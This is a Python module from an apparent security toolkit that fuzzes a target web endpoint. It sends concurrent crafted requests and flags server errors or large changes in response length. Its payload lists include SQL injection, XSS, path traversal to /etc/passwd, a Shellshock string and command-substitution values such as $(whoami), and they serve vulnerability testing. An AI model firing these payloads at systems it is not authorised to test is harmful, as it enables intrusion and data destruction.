"""HTTP Fuzzer Module.

Fuzz HTTP endpoints with random and crafted inputs to detect crashes and anomalous responses.
"""

import asyncio
import random
import time
from typing import Any, Dict, List, Tuple

import aiohttp

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)

# Common fuzzing payloads
FUZZ_STRINGS: List[str] = [
    "", " ", "A" * 1000, "A" * 10000, "A" * 100000,
    "%00", "%0a%0d", "%n%n%n%n%n", "%s%s%s%s%s", "%x%x%x%x%x",
    "'", "''", "\"", "' OR '1'='1", "'; DROP TABLE users;--",
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
    "../../../etc/passwd", "..\\..\\..\\windows\\system32",
    "\x00\x00\x00\x00", "\xff\xff\xff\xff",
    "-1", "0", "2147483647", "-2147483648", "99999999999999999",
    "true", "false", "null", "undefined", "NaN", "Infinity",
    "{}", "[]", "{\"a\":\"b\"}", "{{7*7}}", "${7*7}",
    "\u0000", "\u200b", "\uffff", "\ud800",
    "() { :; }; echo vulnerable", "`id`", "$(whoami)",
    "admin", "root", "test", "guest",
]

FUZZ_HEADERS: Dict[str, List[str]] = {
    "Content-Type": ["text/html", "application/xml", "invalid/type", ""],
    "X-Forwarded-For": ["127.0.0.1", "0.0.0.0", "::1", "A" * 500],
    "User-Agent": ["", "A" * 5000, "<script>alert(1)</script>"],
    "Referer": ["javascript:alert(1)", "https://evil.com", ""],
}


class HttpFuzzerModule(AtsModule):
    """Fuzz HTTP endpoints with crafted inputs to detect anomalous behaviour."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="http_fuzzer",
            category=ModuleCategory.FUZZING,
            description="Fuzz HTTP endpoints with random/crafted inputs to detect crashes and anomalous responses",
            version="1.0.0",
            parameters=[
                Parameter(name="target_url", type=ParameterType.URL, description="Target URL to fuzz", required=True),
                Parameter(name="methods", type=ParameterType.LIST, description="HTTP methods to test", required=False, default=["GET", "POST"]),
                Parameter(name="fuzz_params", type=ParameterType.BOOLEAN, description="Fuzz URL query parameters", required=False, default=True),
                Parameter(name="fuzz_headers", type=ParameterType.BOOLEAN, description="Fuzz HTTP headers", required=False, default=True),
                Parameter(name="max_requests", type=ParameterType.INTEGER, description="Maximum number of fuzz requests", required=False, default=100, min_value=1, max_value=5000),
                Parameter(name="timeout", type=ParameterType.INTEGER, description="Request timeout in seconds", required=False, default=10, min_value=1, max_value=60),
                Parameter(name="concurrency", type=ParameterType.INTEGER, description="Number of concurrent requests", required=False, default=10, min_value=1, max_value=50),
            ],
            outputs=[
                OutputField(name="results", type="list", description="Fuzz test results with status codes and anomalies"),
                OutputField(name="anomalies", type="list", description="Detected anomalous responses"),
                OutputField(name="summary", type="dict", description="Fuzzing session summary"),
            ],
            requires_api_key=False,
            api_key_service=None,
            tags=["fuzzing", "http", "web", "security"],
            author="ATS-Toolkit",
            dangerous=True,
        )

    def validate_inputs(self, config: Dict[str, Any]) -> Tuple[bool, str]:
        url = config.get("target_url", "").strip()
        if not url:
            return False, "target_url is required"
        if not url.startswith(("http://", "https://")):
            return False, "target_url must start with http:// or https://"
        return True, ""

    async def _send_request(
        self, session: aiohttp.ClientSession, method: str, url: str,
        params: Dict | None, headers: Dict | None, body: str | None, timeout: int,
    ) -> Dict[str, Any]:
        """Send a single fuzz request and capture the response."""
        start = time.perf_counter()
        try:
            async with session.request(
                method, url, params=params, headers=headers, data=body,
                timeout=aiohttp.ClientTimeout(total=timeout), ssl=False,
            ) as resp:
                elapsed_ms = int((time.perf_counter() - start) * 1000)
                body_text = await resp.text(errors="replace")
                return {
                    "status": resp.status,
                    "length": len(body_text),
                    "elapsed_ms": elapsed_ms,
                    "error": None,
                }
        except Exception as exc:
            elapsed_ms = int((time.perf_counter() - start) * 1000)
            return {"status": 0, "length": 0, "elapsed_ms": elapsed_ms, "error": type(exc).__name__}

    async def execute(self, config: Dict[str, Any]) -> Dict[str, Any]:
        target_url = config["target_url"].strip()
        methods = config.get("methods", ["GET", "POST"])
        fuzz_params = config.get("fuzz_params", True)
        fuzz_hdrs = config.get("fuzz_headers", True)
        max_requests = config.get("max_requests", 100)
        timeout = config.get("timeout", 10)
        concurrency = config.get("concurrency", 10)

        self.logger.info("http_fuzz_start", url=target_url, max_requests=max_requests)

        # Build a baseline first
        semaphore = asyncio.Semaphore(concurrency)
        results: List[Dict[str, Any]] = []
        anomalies: List[Dict[str, Any]] = []

        async with aiohttp.ClientSession() as session:
            baseline = await self._send_request(session, "GET", target_url, None, None, None, timeout)
            baseline_status = baseline["status"]
            baseline_length = baseline["length"]

            # Build fuzz cases
            cases: List[Dict[str, Any]] = []
            for method in methods:
                if fuzz_params:
                    for payload in FUZZ_STRINGS:
                        cases.append({"method": method, "params": {"fuzz": payload}, "headers": None, "body": None, "payload": payload, "vector": "param"})
                if fuzz_hdrs:
                    for hdr, values in FUZZ_HEADERS.items():
                        for val in values:
                            cases.append({"method": method, "params": None, "headers": {hdr: val}, "body": None, "payload": val, "vector": f"header:{hdr}"})
                if method in ("POST", "PUT"):
                    for payload in FUZZ_STRINGS[:20]:
                        cases.append({"method": method, "params": None, "headers": None, "body": payload, "payload": payload, "vector": "body"})

            random.shuffle(cases)
            cases = cases[:max_requests]

            async def _run_case(case: Dict[str, Any]) -> None:
                async with semaphore:
                    res = await self._send_request(
                        session, case["method"], target_url,
                        case["params"], case["headers"], case["body"], timeout,
                    )
                    entry = {
                        "method": case["method"],
                        "vector": case["vector"],
                        "payload": case["payload"][:200],
                        **res,
                    }
                    results.append(entry)
                    # Detect anomalies
                    if res["status"] >= 500 or (res["status"] != 0 and abs(res["length"] - baseline_length) > baseline_length * 0.5 and baseline_length > 0):
                        anomalies.append(entry)

            await asyncio.gather(*[_run_case(c) for c in cases])

        status_dist: Dict[int, int] = {}
        for r in results:
            status_dist[r["status"]] = status_dist.get(r["status"], 0) + 1

        summary = {
            "target_url": target_url,
            "total_requests": len(results),
            "anomalies_found": len(anomalies),
            "baseline_status": baseline_status,
            "baseline_length": baseline_length,
            "status_distribution": status_dist,
            "error_count": sum(1 for r in results if r["error"]),
        }

        self.logger.info("http_fuzz_complete", total=len(results), anomalies=len(anomalies))
        return {"results": results, "anomalies": anomalies, "summary": summary}
